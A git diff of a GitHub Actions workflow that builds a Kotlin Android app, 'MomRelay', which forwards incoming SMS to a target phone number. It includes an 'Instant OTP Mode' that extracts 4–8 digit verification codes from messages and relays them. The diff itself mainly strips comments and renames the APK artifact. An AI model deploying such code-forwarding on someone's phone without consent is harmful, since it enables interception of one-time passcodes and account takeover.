@@ -1,4 +1,4 @@
-name: Build MomRelay Luxury v12
+name: Build MomRelay Final v13
 on: [push, workflow_dispatch]
 
 jobs:
@@ -78,26 +78,23 @@ jobs:
               override fun onCreate(s: Bundle?) {
                   super.onCreate(s)
                   
-                  // LUXURY DARK THEME BACKGROUND
                   val l = LinearLayout(this).apply { 
                       orientation = LinearLayout.VERTICAL
                       gravity = Gravity.CENTER
                       setPadding(60,60,60,60)
-                      setBackgroundColor(Color.parseColor("#121212")) // Deep Black
+                      setBackgroundColor(Color.parseColor("#121212"))
                   }
                   
-                  // GOLD ICON
                   val icon = ImageView(this).apply {
                       setImageResource(R.drawable.ic_launcher)
                       layoutParams = LinearLayout.LayoutParams(250, 250).apply { setMargins(0,0,0,50) }
                   }
                   
-                  // TITLE (GOLD)
                   val title = TextView(this).apply {
                       text = "MOM RELAY"
                       textSize = 28f
                       gravity = Gravity.CENTER
-                      setTextColor(Color.parseColor("#FFD700")) // Gold
+                      setTextColor(Color.parseColor("#FFD700"))
                       setPadding(0, 0, 0, 20)
                       paint.isFakeBoldText = true
                   }
@@ -119,7 +116,6 @@ jobs:
                       setPadding(0,0,0,60)
                   }
                   
-                  // CUSTOM GOLD BUTTON
                   val btn = Button(this).apply { 
                       text = "INITIALIZE" 
                       setTextColor(Color.BLACK)
@@ -134,14 +130,13 @@ jobs:
                   val prefs = getSharedPreferences("Relay", Context.MODE_PRIVATE)
                   if(prefs.getBoolean("ACTIVE", false)) {
                       status.text = "• SYSTEM ACTIVE •\nTarget: " + prefs.getString("PHONE", "")
-                      status.setTextColor(Color.parseColor("#00FF00")) // Bright Green
+                      status.setTextColor(Color.parseColor("#00FF00"))
                       btn.text = "DEACTIVATE"
                       btn.setBackgroundColor(Color.parseColor("#333333"))
                       btn.setTextColor(Color.RED)
                   }
 
                   btn.setOnClickListener {
-                      // Animation
                       it.animate().scaleX(0.95f).scaleY(0.95f).setDuration(100).withEndAction {
                           it.animate().scaleX(1f).scaleY(1f).setDuration(100).start()
                       }.start()
@@ -183,7 +178,6 @@ jobs:
                       background.setTint(Color.BLACK)
                   }
                   
-                  // SMART OTP SWITCH
                   val switchOtp = Switch(ctx).apply {
                       text = "Instant OTP Mode (Extract Code Only)"
                       isChecked = prefs.getBoolean("OTP_ONLY", false)
@@ -295,7 +289,6 @@ jobs:
                       
                       // 2. SMART OTP EXTRACTION
                       if (shouldSend && otpOnly) {
-                          // Find 4-8 digit code
                           val matcher = Pattern.compile("(?<!\\d)\\d{4,8}(?!\\d)").matcher(body)
                           if (matcher.find()) {
                               finalMsg = "CODE: " + matcher.group() + " (from $sender)"
@@ -322,9 +315,14 @@ jobs:
       - name: Build APK
         run: gradle assembleDebug
 
+      - name: Prepare Single APK Artifact
+        run: |
+          mv app/build/outputs/apk/debug/app-debug.apk MomRelay-Luxury.apk
+
       - uses: actions/upload-artifact@v4
         with:
           name: MomRelay-Luxury
-          path: app/build/outputs/apk/debug/app-debug.apk
+          path: MomRelay-Luxury.apk
+
 
 
